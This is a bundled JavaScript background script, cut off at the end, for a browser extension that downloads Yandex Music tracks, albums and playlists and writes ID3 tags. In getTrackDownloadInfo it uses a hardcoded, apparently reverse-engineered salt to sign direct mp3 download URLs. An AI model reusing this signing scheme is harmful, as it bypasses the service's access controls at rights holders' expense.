'use strict';
(function(modules) {
    var installedModules = {};

    function __webpack_require__(moduleId) {
        if (installedModules[moduleId]) return installedModules[moduleId].exports;
        var module = installedModules[moduleId] = {
            i: moduleId,
            l: false,
            exports: {}
        };
        modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
        module.l = true;
        return module.exports
    }
    __webpack_require__.m = modules;
    __webpack_require__.c = installedModules;
    __webpack_require__.d = function(exports, name, getter) {
        if (!__webpack_require__.o(exports,
                name)) Object.defineProperty(exports, name, {
            configurable: false,
            enumerable: true,
            get: getter
        })
    };
    __webpack_require__.n = function(module) {
        var getter = module && module.__esModule ? function getDefault() {
            return module["default"]
        } : function getModuleExports() {
            return module
        };
        __webpack_require__.d(getter, "a", getter);
        return getter
    };
    __webpack_require__.o = function(object, property) {
        return Object.prototype.hasOwnProperty.call(object, property)
    };
    __webpack_require__.p = "";
    return __webpack_require__(__webpack_require__.s = 1)
})([function(module,
    exports, __webpack_require__) {
    var __WEBPACK_AMD_DEFINE_RESULT__;
    (function($) {
        function safeAdd(x, y) {
            var lsw = (x & 65535) + (y & 65535);
            var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
            return msw << 16 | lsw & 65535
        }

        function bitRotateLeft(num, cnt) {
            return num << cnt | num >>> 32 - cnt
        }

        function md5cmn(q, a, b, x, s, t) {
            return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b)
        }

        function md5ff(a, b, c, d, x, s, t) {
            return md5cmn(b & c | ~b & d, a, b, x, s, t)
        }

        function md5gg(a, b, c, d, x, s, t) {
            return md5cmn(b & d | c & ~d, a, b, x, s, t)
        }

        function md5hh(a, b, c, d, x, s, t) {
            return md5cmn(b ^
                c ^ d, a, b, x, s, t)
        }

        function md5ii(a, b, c, d, x, s, t) {
            return md5cmn(c ^ (b | ~d), a, b, x, s, t)
        }

        function binlMD5(x, len) {
            x[len >> 5] |= 128 << len % 32;
            x[(len + 64 >>> 9 << 4) + 14] = len;
            var i;
            var olda;
            var oldb;
            var oldc;
            var oldd;
            var a = 1732584193;
            var b = -271733879;
            var c = -1732584194;
            var d = 271733878;
            for (i = 0; i < x.length; i += 16) {
                olda = a;
                oldb = b;
                oldc = c;
                oldd = d;
                a = md5ff(a, b, c, d, x[i], 7, -680876936);
                d = md5ff(d, a, b, c, x[i + 1], 12, -389564586);
                c = md5ff(c, d, a, b, x[i + 2], 17, 606105819);
                b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330);
                a = md5ff(a, b, c, d, x[i + 4], 7, -176418897);
                d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426);
                c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341);
                b = md5ff(b, c, d, a, x[i + 7], 22, -45705983);
                a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416);
                d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417);
                c = md5ff(c, d, a, b, x[i + 10], 17, -42063);
                b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162);
                a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682);
                d = md5ff(d, a, b, c, x[i + 13], 12, -40341101);
                c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290);
                b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329);
                a = md5gg(a, b, c, d, x[i + 1], 5, -165796510);
                d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632);
                c = md5gg(c,
                    d, a, b, x[i + 11], 14, 643717713);
                b = md5gg(b, c, d, a, x[i], 20, -373897302);
                a = md5gg(a, b, c, d, x[i + 5], 5, -701558691);
                d = md5gg(d, a, b, c, x[i + 10], 9, 38016083);
                c = md5gg(c, d, a, b, x[i + 15], 14, -660478335);
                b = md5gg(b, c, d, a, x[i + 4], 20, -405537848);
                a = md5gg(a, b, c, d, x[i + 9], 5, 568446438);
                d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690);
                c = md5gg(c, d, a, b, x[i + 3], 14, -187363961);
                b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501);
                a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467);
                d = md5gg(d, a, b, c, x[i + 2], 9, -51403784);
                c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473);
                b = md5gg(b, c, d, a, x[i + 12],
                    20, -1926607734);
                a = md5hh(a, b, c, d, x[i + 5], 4, -378558);
                d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463);
                c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562);
                b = md5hh(b, c, d, a, x[i + 14], 23, -35309556);
                a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060);
                d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353);
                c = md5hh(c, d, a, b, x[i + 7], 16, -155497632);
                b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640);
                a = md5hh(a, b, c, d, x[i + 13], 4, 681279174);
                d = md5hh(d, a, b, c, x[i], 11, -358537222);
                c = md5hh(c, d, a, b, x[i + 3], 16, -722521979);
                b = md5hh(b, c, d, a, x[i + 6], 23, 76029189);
                a = md5hh(a, b, c, d, x[i + 9], 4, -640364487);
                d = md5hh(d, a, b, c, x[i + 12], 11, -421815835);
                c = md5hh(c, d, a, b, x[i + 15], 16, 530742520);
                b = md5hh(b, c, d, a, x[i + 2], 23, -995338651);
                a = md5ii(a, b, c, d, x[i], 6, -198630844);
                d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415);
                c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905);
                b = md5ii(b, c, d, a, x[i + 5], 21, -57434055);
                a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571);
                d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606);
                c = md5ii(c, d, a, b, x[i + 10], 15, -1051523);
                b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799);
                a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359);
                d = md5ii(d, a, b, c, x[i + 15], 10, -30611744);
                c = md5ii(c,
                    d, a, b, x[i + 6], 15, -1560198380);
                b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649);
                a = md5ii(a, b, c, d, x[i + 4], 6, -145523070);
                d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379);
                c = md5ii(c, d, a, b, x[i + 2], 15, 718787259);
                b = md5ii(b, c, d, a, x[i + 9], 21, -343485551);
                a = safeAdd(a, olda);
                b = safeAdd(b, oldb);
                c = safeAdd(c, oldc);
                d = safeAdd(d, oldd)
            }
            return [a, b, c, d]
        }

        function binl2rstr(input) {
            var i;
            var output = "";
            var length32 = input.length * 32;
            for (i = 0; i < length32; i += 8) output += String.fromCharCode(input[i >> 5] >>> i % 32 & 255);
            return output
        }

        function rstr2binl(input) {
            var i;
            var output = [];
            output[(input.length >> 2) - 1] = undefined;
            for (i = 0; i < output.length; i += 1) output[i] = 0;
            var length8 = input.length * 8;
            for (i = 0; i < length8; i += 8) output[i >> 5] |= (input.charCodeAt(i / 8) & 255) << i % 32;
            return output
        }

        function rstrMD5(s) {
            return binl2rstr(binlMD5(rstr2binl(s), s.length * 8))
        }

        function rstrHMACMD5(key, data) {
            var i;
            var bkey = rstr2binl(key);
            var ipad = [];
            var opad = [];
            var hash;
            ipad[15] = opad[15] = undefined;
            if (bkey.length > 16) bkey = binlMD5(bkey, key.length * 8);
            for (i = 0; i < 16; i += 1) {
                ipad[i] = bkey[i] ^ 909522486;
                opad[i] =
                    bkey[i] ^ 1549556828
            }
            hash = binlMD5(ipad.concat(rstr2binl(data)), 512 + data.length * 8);
            return binl2rstr(binlMD5(opad.concat(hash), 512 + 128))
        }

        function rstr2hex(input) {
            var hexTab = "0123456789abcdef";
            var output = "";
            var x;
            var i;
            for (i = 0; i < input.length; i += 1) {
                x = input.charCodeAt(i);
                output += hexTab.charAt(x >>> 4 & 15) + hexTab.charAt(x & 15)
            }
            return output
        }

        function str2rstrUTF8(input) {
            return unescape(encodeURIComponent(input))
        }

        function rawMD5(s) {
            return rstrMD5(str2rstrUTF8(s))
        }

        function hexMD5(s) {
            return rstr2hex(rawMD5(s))
        }

        function rawHMACMD5(k,
            d) {
            return rstrHMACMD5(str2rstrUTF8(k), str2rstrUTF8(d))
        }

        function hexHMACMD5(k, d) {
            return rstr2hex(rawHMACMD5(k, d))
        }

        function md5(string, key, raw) {
            if (!key) {
                if (!raw) return hexMD5(string);
                return rawMD5(string)
            }
            if (!raw) return hexHMACMD5(key, string);
            return rawHMACMD5(key, string)
        }
        if (true) !(__WEBPACK_AMD_DEFINE_RESULT__ = function() {
            return md5
        }.call(exports, __webpack_require__, exports, module), __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
        else if (typeof module === "object" &&
            module.exports) module.exports = md5;
        else $.md5 = md5
    })(this)
}, function(module, __webpack_exports__, __webpack_require__) {
    Object.defineProperty(__webpack_exports__, "__esModule", {
        value: true
    });
    var utils_namespaceObject = {};
    __webpack_require__.d(utils_namespaceObject, "fetchBuffer", function() {
        return fetchBuffer
    });
    __webpack_require__.d(utils_namespaceObject, "bytesToStr", function() {
        return bytesToStr
    });
    __webpack_require__.d(utils_namespaceObject, "addExtraZeros", function() {
        return addExtraZeros
    });
    __webpack_require__.d(utils_namespaceObject,
        "durationToStr",
        function() {
            return durationToStr
        });
    __webpack_require__.d(utils_namespaceObject, "clearPath", function() {
        return clearPath
    });
    __webpack_require__.d(utils_namespaceObject, "parseArtists", function() {
        return parseArtists
    });
    __webpack_require__.d(utils_namespaceObject, "getUrlInfo", function() {
        return getUrlInfo
    });
    __webpack_require__.d(utils_namespaceObject, "updateTabIcon", function() {
        return updateTabIcon
    });
    __webpack_require__.d(utils_namespaceObject, "getActiveTab", function() {
        return getActiveTab
    });
    __webpack_require__.d(utils_namespaceObject, "updateBadge", function() {
        return updateBadge
    });
    __webpack_require__.d(utils_namespaceObject, "getOS", function() {
        return getOS
    });
    __webpack_require__.d(utils_namespaceObject, "rand", function() {
        return rand
    });
    var querystring_es3 = __webpack_require__(2);
    var querystring_es3_default = __webpack_require__.n(querystring_es3);

    function fetchBuffer(url, onProgress) {
        return new Promise((resolve, reject) => {
            const xhr = new XMLHttpRequest;
            xhr.open("GET", url, true);
            xhr.responseType = "arraybuffer";
            xhr.onload = () => {
                if (xhr.status >= 200 && xhr.status < 300)
                    if (xhr.response) resolve(xhr.response);
                    else reject(new Error("Empty result"));
                else reject(new Error(`${xhr.status} (${xhr.statusText})`))
            };
            xhr.onerror = () => reject(new Error("Network error"));
            if (onProgress) xhr.onprogress = onProgress;
            xhr.send()
        })
    }

    function bytesToStr(bytes) {
        const KiB = 1024;
        const MiB = 1024 * KiB;
        const GiB = 1024 * MiB;
        if (bytes < GiB) return `${(bytes/MiB).toFixed(1)} \u041c\u0411`;
        else return `${(bytes/GiB).toFixed(1)} \u0413\u0411`
    }

    function addExtraZeros(val,
        max) {
        const valLength = val.toString().length;
        const maxLength = max.toString().length;
        const diff = maxLength - valLength;
        let zeros = "";
        for (let i = 0; i < diff; i++) zeros += "0";
        return zeros + val.toString()
    }

    function durationToStr(duration) {
        let seconds = Math.floor(duration);
        let minutes = Math.floor(seconds / 60);
        seconds -= minutes * 60;
        const hours = Math.floor(minutes / 60);
        minutes -= hours * 60;
        return `${hours}:${addExtraZeros(minutes,10)}:${addExtraZeros(seconds,10)}`
    }

    function clearPath(path, isDir = false) {
        const unsafeChars = /[\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200b-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
        let p = path.replace(/^\./, "_");
        p = p.replace(/"/g, "''");
        p = p.replace(/\t/g, " ");
        p = p.replace(unsafeChars, "");
        p = p.replace(/[\\/:*?<>|~]/g, "_");
        if (isDir) p = p.replace(/([. ])$/, "_");
        return p
    }

    function parseArtists(allArtists) {
        const VA = "Various Artists";
        const UA = "Unknown Artist";
        const composers = [];
        let artists = [];
        allArtists.forEach((artist) => {
            if (artist.composer) composers.push(artist.name);
            else if (artist.various) artists.push(VA);
            else artists.push(artist.name)
        });
        if (artists.length === 0)
            if (composers.length > 0) artists =
                composers;
            else artists = [UA];
        return {
            artists,
            composers
        }
    }

    function getUrlInfo(url) {
        const info = {
            isMusic: false,
            isRadio: false,
            isPlaylist: false,
            isTrack: false,
            isAlbum: false,
            isArtist: false,
            isLabel: false
        };
        if (!url) return info;
        const urlData = new URL(url);
        const parts = urlData.pathname.split("/");
        const musicMatch = urlData.hostname.match(/^music\.yandex\.(ru|by|kz|ua)$/);
        const radioMatch = urlData.hostname.match(/^radio\.yandex\.(ru|by|kz|ua)$/);
        if (musicMatch) {
            info.isMusic = true;
            fisher.yandex.domain = musicMatch[1]
        } else if (radioMatch) {
            info.isRadio =
                true;
            fisher.yandex.domain = radioMatch[1]
        }
        if (!info.isMusic) return info;
        info.isPlaylist = parts.length === 5 && parts[1] === "users" && parts[3] === "playlists";
        info.isTrack = parts.length === 5 && parts[1] === "album" && parts[3] === "track";
        info.isAlbum = parts.length === 3 && parts[1] === "album";
        info.isArtist = parts.length > 2 && parts[1] === "artist";
        info.isLabel = parts.length > 2 && parts[1] === "label";
        if (info.isPlaylist) {
            info.username = parts[2];
            info.playlistId = parts[4]
        } else if (info.isTrack) {
            info.trackId = parts[4];
            info.albumId = parts[2]
        } else if (info.isAlbum) info.albumId =
            parts[2];
        else if (info.isArtist) info.artistId = parts[2];
        else if (info.isLabel) info.labelId = parts[2];
        const query = querystring_es3_default.a.parse(urlData.search);
        if ("page" in query) info.page = query.page;
        return info
    }

    function updateTabIcon(tab) {
        const page = getUrlInfo(tab.url);
        let icon = "black";
        if (page.isPlaylist) icon = "green";
        else if (page.isAlbum) icon = "yellow";
        else if (page.isArtist || page.isLabel) icon = "pink";
        else if (page.isMusic || page.isRadio) icon = "blue";
        chrome.browserAction.setIcon({
            tabId: tab.id,
            path: `img/${icon}.png`
        })
    }

    function getActiveTab() {
        return new Promise((resolve, reject) => {
            chrome.tabs.query({
                active: true,
                currentWindow: true
            }, (tabs) => {
                if (tabs.length > 0) resolve(tabs[0]);
                else reject(new Error("No active tab"))
            })
        })
    }

    function updateBadge() {
        const count = window.fisher.downloader.getDownloadCount();
        chrome.browserAction.setBadgeText({
            text: count > 0 ? count.toString() : ""
        })
    }

    function getOS() {
        function f(s) {
            return navigator.userAgent.toLowerCase().indexOf(s) !== -1
        }

        function ios() {
            return !windows() && f("iphone") || f("ipod") || f("ipad")
        }

        function android() {
            return !windows() && f("android")
        }

        function windows() {
            return f("windows") || f("win32")
        }

        function tv() {
            const televisions = ["webos", "smarthub", "tizen", "googletv", "viera", "smarttv", "internet.tv", "netcast", "nettv", "appletv", "boxee", "kylo", "roku", "dlnadoc", "roku", "pov_tv", 
"hbbtv", "ce-html"];
            for (let i = 0; i < televisions.length; i++)
                if (f(televisions[i])) return true;
            return false
        }
        const p = navigator.platform;
        if (tv()) return 6;
        else if (ios()) return 1;
        else if (android()) return 2;
        else if (windows()) return 4;
        else if (p.toLowerCase().indexOf("mac") !== -1) return 3;
        else if (p.toLowerCase().indexOf("linux") !== -1) return 5;
        return 0
    }

    function rand(min, max) {
        return Math.round(Math.random() * (max - min) + min)
    }
    var md5 = __webpack_require__(0);
    var md5_default = __webpack_require__.n(md5);
    const options = {
        headers: {
            "X-Retpath-Y": encodeURIComponent("https://music.yandex.ru/")
        },
        redirect: "error",
        credentials: "include"
    };

    function parseJsonResponse(response) {
        if (!response.ok) throw new Error(`${response.status} (${response.statusText})`);
        return response.json()
    }
    class yandex_Yandex {
        constructor() {
            this.domain = "ru"
        }
        get baseUrl() {
            return `https://music.yandex.${this.domain}`
        }
        async getTrackDownloadInfo(trackId) {
            const trackInfoUrl = `${this.baseUrl}/api/v2.1/handlers/track/${trackId}/track/download/m?hq=1`;
            const trackInfo = await parseJsonResponse(await fetch(trackInfoUrl, options));
            const downloadInfo = await parseJsonResponse(await fetch(`https://${trackInfo.src}&format=json`));
            const salt = "XGRlBW9FXlekgbPrRHuSiA";
            const hash = md5_default()(salt + downloadInfo.path.substr(1) +
                downloadInfo.s);
            return {
                url: `https://${downloadInfo.host}/get-mp3/${hash}/${downloadInfo.ts+downloadInfo.path}`,
                codec: trackInfo.codec
            }
        }
        getTrack(trackId, albumId) {
            const url = `${this.baseUrl}/handlers/track.jsx?track=${trackId}%3A${albumId}`;
            return fetch(url, options).then(parseJsonResponse)
        }
        getArtist(artistId) {
            const url = `${this.baseUrl}/handlers/artist.jsx?artist=${artistId}&what={what}&sort=&dir=&lang=ru&external-domain=music.yandex.ru&overembed=false&ncrnd=${Math.random()}`;
            return Promise.all([fetch(url.replace("{what}",
                "albums"), options), fetch(url.replace("{what}", "tracks"), options)]).then((res) => Promise.all([parseJsonResponse(res[0]), parseJsonResponse(res[1])])).then((res) => {
                res[0].tracks = res[1].tracks;
                return res[0]
            })
        }
        getAlbum(albumId) {
            const url = `${this.baseUrl}/handlers/album.jsx?album=${albumId}`;
            return fetch(url, options).then(parseJsonResponse)
        }
        getPlaylist(username, playlistId) {
            const url = `${this.baseUrl}/handlers/playlist.jsx?owner=${username}&kinds=${playlistId}`;
            return fetch(url, options).then(parseJsonResponse).then((json) =>
                json.playlist)
        }
        getLabel(labelId, pageNum) {
            let url = `${this.baseUrl}/handlers/label.jsx?sort=year&id=${labelId}`;
            if (pageNum !== undefined) url += `&page=${pageNum}`;
            return fetch(url, options).then(parseJsonResponse)
        }
    }
    class storage {
        static get defaults() {
            return {
                downloadThreadCount: 4,
                shouldDownloadCover: true,
                albumCoverSize: "600x600",
                albumCoverSizeId3: "400x400",
                enumerateAlbums: true,
                enumeratePlaylists: false,
                singleClickDownload: false,
                shouldUseFolder: false,
                folder: "music",
                id: false
            }
        }
        static getItem(item) {
            const value =
                localStorage.getItem(item);
            return value === null ? this.defaults[item] : JSON.parse(value)
        }
        static setItem(item, value) {
            localStorage.setItem(item, JSON.stringify(value))
        }
        static reset() {
            localStorage.clear()
        }
    }
    var browser_id3_writer = __webpack_require__(5);
    var browser_id3_writer_default = __webpack_require__.n(browser_id3_writer);
    const downloader = {
        TYPE: Object.freeze({
            TRACK: "track",
            ALBUM: "album",
            PLAYLIST: "playlist",
            COVER: "cover"
        }),
        STATUS: Object.freeze({
            WAITING: "waiting",
            LOADING: "loading",
            FINISHED: "finished",
            INTERRUPTED: "interrupted"
        }),
        PATH_LIMIT: 50,
        downloads: new Map,
        downloadsLastIndex: 0,
        activeThreadCount: 0,
        minBitrate: 192 * 1E3 / 8,
        maxBitrate: 320 * 1E3 / 8
    };
    downloader.runAllThreads = () => {
        for (let i = 0; i < fisher.storage.getItem("downloadThreadCount"); i++) downloader.download()
    };
    downloader.download = async () => {
        fisher.utils.updateBadge();
        if (downloader.activeThreadCount < 0) downloader.activeThreadCount = 0;
        if (downloader.activeThreadCount >= fisher.storage.getItem("downloadThreadCount")) return;
        const entity = downloader.getWaitingEntity();
        if (!entity) return;
        entity.status = downloader.STATUS.LOADING;
        downloader.activeThreadCount++;
        let coverBuffer;
        let trackAlbum;

        function onInterruptEntity(error) {
            entity.loadedBytes = 0;
            entity.status = downloader.STATUS.INTERRUPTED;
            console.error(error, entity);
            downloader.activeThreadCount--;
            downloader.download()
        }

        function onProgress(event) {
            entity.loadedBytes = event.loaded
        }

        function onChromeDownloadStart(downloadId) {
            if (chrome.runtime.lastError) onInterruptEntity(chrome.runtime.lastError.message);
            else {
                if (false) chrome.downloads.setShelfEnabled(false);
                entity.browserDownloadId = downloadId
            }
        }

        function saveTrack(buffer, codec) {
            if (!downloader.downloads.has(entity.index)) return;
            const writer = new browser_id3_writer_default.a(buffer);
            const artists = fisher.utils.parseArtists(entity.track.artists);
            if (trackAlbum) {
                if ("artists" in trackAlbum && Array.isArray(trackAlbum.artists)) writer.setFrame("TPE2", fisher.utils.parseArtists(trackAlbum.artists).artists.join(", "));
                if ("genre" in trackAlbum && typeof trackAlbum.genre === "string") writer.setFrame("TCON", [trackAlbum.genre[0].toUpperCase() +
                    trackAlbum.genre.substr(1)
                ]);
                if ("title" in trackAlbum) writer.setFrame("TALB", trackAlbum.title);
                if ("year" in trackAlbum) writer.setFrame("TYER", trackAlbum.year);
                if ("labels" in trackAlbum && Array.isArray(trackAlbum.labels) && trackAlbum.labels.length) writer.setFrame("TPUB", trackAlbum.labels.map((label) => label.name).join(", "));
                if ("trackPosition" in entity && "trackCountInAlbum" in entity) writer.setFrame("TRCK", `${entity.trackPosition}/${entity.trackCountInAlbum}`);
                if ("albumPosition" in entity && "albumCount" in entity) writer.setFrame("TPOS",
                    `${entity.albumPosition}/${entity.albumCount}`)
            }
            if ("title" in entity) writer.setFrame("TIT2", entity.title);
            if (artists.artists.length > 0) writer.setFrame("TPE1", artists.artists);
            if ("durationMs" in entity.track) writer.setFrame("TLEN", entity.track.durationMs);
            if (artists.composers.length > 0) writer.setFrame("TCOM", artists.composers);
            if ("lyrics" in entity && typeof entity.lyrics === "string") writer.setFrame("USLT", {
                description: "",
                lyrics: entity.lyrics
            });
            if (coverBuffer) try {
                writer.setFrame("APIC", {
                    type: 3,
                    data: coverBuffer,
                    description: ""
                })
            } catch (e) {
                console.error(e, entity)
            }
            writer.addTag();
            let savePath = entity.savePath;
            if (fisher.storage.getItem("shouldUseFolder")) savePath = `${fisher.storage.getItem("folder")}/${savePath}`;
            if (codec === "mp3") {
                entity.browserDownloadUrl = writer.getURL();
                savePath += ".mp3"
            } else if (codec === "aac") {
                entity.browserDownloadUrl = window.URL.createObjectURL(new Blob([buffer]));
                savePath += ".m4a"
            }
            chrome.downloads.download({
                url: entity.browserDownloadUrl,
                filename: savePath,
                conflictAction: "overwrite"
            }, onChromeDownloadStart)
        }
        if (entity.type === downloader.TYPE.TRACK) {
            if ("albums" in entity.track && entity.track.albums.length > 0) trackAlbum = entity.track.albums[0];
            if (trackAlbum && "coverUri" in trackAlbum) {
                const coverUrl = `https://${trackAlbum.coverUri.replace("%%",fisher.storage.getItem("albumCoverSizeId3"))}`;
                try {
                    coverBuffer = await fisher.utils.fetchBuffer(coverUrl)
                } catch (e) {
                    if (e.message !== "404 (Not found)") {
                        onInterruptEntity(e.message);
                        return
                    }
                }
            }
            try {
                const downloadInfo = await fisher.yandex.getTrackDownloadInfo(entity.track.id);
                const buffer =
                    await fisher.utils.fetchBuffer(downloadInfo.url, onProgress);
                saveTrack(buffer, downloadInfo.codec)
            } catch (e) {
                onInterruptEntity(e.message)
            }
        } else if (entity.type === downloader.TYPE.COVER) {
            let buffer;
            try {
                buffer = await fisher.utils.fetchBuffer(entity.url, onProgress)
            } catch (e) {
                if (e.message !== "404 (Not found)") {
                    onInterruptEntity(e.message);
                    return
                }
            }
            if (!downloader.downloads.has(entity.index)) return;
            const blob = new Blob([buffer], {
                type: "image/jpeg"
            });
            entity.browserDownloadUrl = window.URL.createObjectURL(blob);
            let savePath =
                entity.savePath;
            if (fisher.storage.getItem("shouldUseFolder")) savePath = `${fisher.storage.getItem("folder")}/${savePath}`;
            chrome.downloads.download({
                url: entity.browserDownloadUrl,
                filename: savePath,
                conflictAction: "overwrite"
            }, onChromeDownloadStart)
        }
    };
    downloader.downloadTrack = (trackId, albumId, folder) => {
        fisher.yandex.getTrack(trackId, albumId).then((json) => {
            const track = json.track;
            if ("error" in track) {
                console.error(`Track error: ${track.error}`, track);
                return
            }
            const trackEntity = {
                type: downloader.TYPE.TRACK,
                status: downloader.STATUS.WAITING,
                index: downloader.downloadsLastIndex++,
                track,
                artists: fisher.utils.parseArtists(track.artists).artists.join(", "),
                title: track.title,
                savePath: "",
                lyrics: null,
                loadedBytes: 0,
                browserDownloadId: null,
                browserDownloadUrl: null
            };
            if ("version" in track) trackEntity.title += ` (${track.version})`;
            if (json.lyric.length && json.lyric[0].fullLyrics) trackEntity.lyrics = json.lyric[0].fullLyrics;
            const shortArtists = trackEntity.artists.substr(0, downloader.PATH_LIMIT);
            const shortTitle = trackEntity.title.substr(0,
                downloader.PATH_LIMIT);
            if (folder) {
                const shortFolder = folder.substr(0, downloader.PATH_LIMIT);
                trackEntity.savePath = `${fisher.utils.clearPath(shortFolder,true)}/`
            }
            trackEntity.savePath += fisher.utils.clearPath(`${shortArtists} - ${shortTitle}`);
            downloader.downloads.set(trackEntity.index, trackEntity);
            downloader.download()
        }).catch((e) => console.error(e))
    };
    downloader.downloadAlbum = (albumId, folder) => {
        fisher.yandex.getAlbum(albumId).then((album) => {
            if (!album.trackCount) return;
            const albumEntity = {
                type: downloader.TYPE.ALBUM,
                index: downloader.downloadsLastIndex++,
                artists: fisher.utils.parseArtists(album.artists).artists.join(", "),
                title: album.title,
                tracks: [],
                cover: null
            };
            if ("version" in album) albumEntity.title += ` (${album.version})`;
            let saveDir = "";
            if (folder) {
                const shortFolder = folder.substr(0, downloader.PATH_LIMIT);
                saveDir += `${fisher.utils.clearPath(shortFolder,true)}/`
            }
            const shortAlbumArtists = albumEntity.artists.substr(0, downloader.PATH_LIMIT);
            const shortAlbumTitle = albumEntity.title.substr(0, downloader.PATH_LIMIT);
            if ("year" in
                album) saveDir += fisher.utils.clearPath(`${album.year} - ${shortAlbumArtists} - ${shortAlbumTitle}`, true);
            else saveDir += fisher.utils.clearPath(`${shortAlbumArtists} - ${shortAlbumTitle}`, true);
            if (fisher.storage.getItem("shouldDownloadCover") && "coverUri" in album) albumEntity.cover = {
                type: downloader.TYPE.COVER,
                index: albumEntity.index,
                status: downloader.STATUS.WAITING,
                url: `https://${album.coverUri.replace("%%",fisher.storage.getItem("albumCoverSize"))}`,
                savePath: `${saveDir}/cover.jpg`,
                loadedBytes: 0,
                browserDownloadId: null,
                browserDownloadUrl: null
            };
            album.volumes.forEach((volume, i) => {
                const trackNameCounter = {};
                volume.forEach((track, j) => {
                    if ("error" in track) {
                        console.error(`Track error: ${track.error}`, track);
                        return
                    }
                    const trackPosition = j + 1;
                    const albumPosition = i + 1;
                    const trackEntity = {
                        type: downloader.TYPE.TRACK,
                        index: albumEntity.index,
                        status: downloader.STATUS.WAITING,
                        track,
                        artists: fisher.utils.parseArtists(track.artists).artists.join(", "),
                        title: track.title,
                        savePath: null,
                        loadedBytes: 0,
                        trackPosition,
                        trackCountInAlbum: volume.length,
                        albumPosition,
                        albumCount: album.volumes.length,
                        browserDownloadId: null,
                        browserDownloadUrl: null
                    };
                    if ("version" in track) trackEntity.title += ` (${track.version})`;
                    let shortTrackTitle = trackEntity.title.substr(0, downloader.PATH_LIMIT);
                    let savePath = `${saveDir}/`;
                    if (album.volumes.length > 1) savePath += `CD${albumPosition}/`;
                    if (fisher.storage.getItem("enumerateAlbums")) savePath += `${fisher.utils.addExtraZeros(trackPosition,volume.length)}. `;
                    else if (shortTrackTitle in trackNameCounter) {
                        trackNameCounter[shortTrackTitle]++;
                        shortTrackTitle += ` (${trackNameCounter[shortTrackTitle]})`
                    } else trackNameCounter[shortTrackTitle] = 1;
                    trackEntity.savePath = savePath + fisher.utils.clearPath(`${shortTrackTitle}`);
                    albumEntity.tracks.push(trackEntity)
                })
            });
            if (!albumEntity.tracks.length) return;
            downloader.downloads.set(albumEntity.index, albumEntity);
            downloader.runAllThreads()
        }).catch((e) => console.error(e))
    };
    downloader.downloadPlaylist = (username, playlistId) => {
        fisher.yandex.getPlaylist(username, playlistId).then((playlist) => {
            if (!playlist.trackCount) return;
            const playlistEntity = {
                type: downloader.TYPE.PLAYLIST,
                index: downloader.downloadsLastIndex++,
                title: playlist.title,
                tracks: []
            };
            const shortPlaylistTitle = playlist.title.substr(0, downloader.PATH_LIMIT);
            const saveDir = fisher.utils.clearPath(shortPlaylistTitle, true);
            const trackNameCounter = {};
            playlist.tracks.forEach((track, i) => {
                if ("error" in track) {
                    console.error(`Track error: ${track.error}`, track);
                    return
                }
                const trackEntity = {
                    type: downloader.TYPE.TRACK,
                    index: playlistEntity.index,
                    status: downloader.STATUS.WAITING,
                    track,
                    artists: fisher.utils.parseArtists(track.artists).artists.join(", "),
                    title: track.title,
                    savePath: null,
                    loadedBytes: 0,
                    browserDownloadId: null,
                    browserDownloadUrl: null
                };
                if ("version" in track) trackEntity.title += ` (${track.version})`;
                const shortTrackArtists = trackEntity.artists.substr(0, downloader.PATH_LIMIT);
                const shortTrackTitle = trackEntity.title.substr(0, downloader.PATH_LIMIT);
                let name = `${shortTrackArtists} - ${shortTrackTitle}`;
                let savePath = `${saveDir}/`;
                if (fisher.storage.getItem("enumeratePlaylists")) savePath +=
                    `${fisher.utils.addExtraZeros(i+1,playlist.tracks.length)}. `;
                else if (name in trackNameCounter) {
                    trackNameCounter[name]++;
                    name += ` (${trackNameCounter[name]})`
                } else trackNameCounter[name] = 1;
                trackEntity.savePath = savePath + fisher.utils.clearPath(`${name}`);
                playlistEntity.tracks.push(trackEntity)
            });
            if (!playlistEntity.tracks.length) return;
            downloader.downloads.set(playlistEntity.index, playlistEntity);
            downloader.runAllThreads()
        }).catch((e) => console.error(e))
    };
    downloader.getWaitingEntity = () => {
        let foundEntity;
        downloader.downloads.forEach((entity) => {
            if (foundEntity) return;
            const isAlbum = entity.type === downloader.TYPE.ALBUM;
            const isCover = isAlbum && entity.cover;
            const isPlaylist = entity.type === downloader.TYPE.PLAYLIST;
            const isTrack = entity.type === downloader.TYPE.TRACK;
            if (isCover && entity.cover.status === downloader.STATUS.WAITING) foundEntity = entity.cover;
            else if (isAlbum || isPlaylist) entity.tracks.forEach((track) => {
                if (foundEntity) return;
                if (track.status === downloader.STATUS.WAITING) foundEntity = track
            });
            else if (isTrack)
                if (entity.status ===
                    downloader.STATUS.WAITING) foundEntity = entity
        });
        return foundEntity
    };
    downloader.getDownloadCount = () => {
        let count = 0;
